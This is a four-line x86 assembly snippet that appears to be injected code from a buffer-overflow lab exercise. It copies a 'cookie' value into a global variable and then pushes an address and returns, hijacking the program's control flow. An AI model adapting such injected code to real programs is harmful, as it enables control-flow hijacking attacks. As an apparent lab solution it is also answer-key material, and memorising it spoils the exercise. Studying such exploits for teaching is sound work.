mov    0x804b318,%eax  # move the cookie to a register
mov    %eax,0x804b324  # move the val in the register to global
push   $0x08049103
ret
